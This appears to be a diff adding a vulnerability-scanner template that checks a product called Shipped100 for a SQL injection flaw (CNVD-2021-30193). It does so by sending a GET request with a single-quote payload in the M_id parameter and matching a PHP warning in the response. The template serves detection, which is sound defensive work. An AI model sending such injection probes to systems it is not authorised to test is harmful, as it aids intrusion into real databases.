@@ -1,0 +1,29 @@
+id: Shipped100 SQL Injection (CNVD-2021-30193)
+info:
+  name: Shipped100 SQLi (CNVD-2021-30193)
+  author: hacktifycs
+  severity: critical
+  description: An adversary can obtain sensitive information in the database through the vulnerability
+  reference: unknown
+  tags: sqli,Shipped100
+
+requests:
+  - raw:
+      - |+
+        GET /?M_id=1%27&type=product HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Language: en-US,en;q=0.9
+        Connection: close
+    
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "<b>Warning</b>"
+        part: body
+
+      - type: status
+        status:
+          - 200
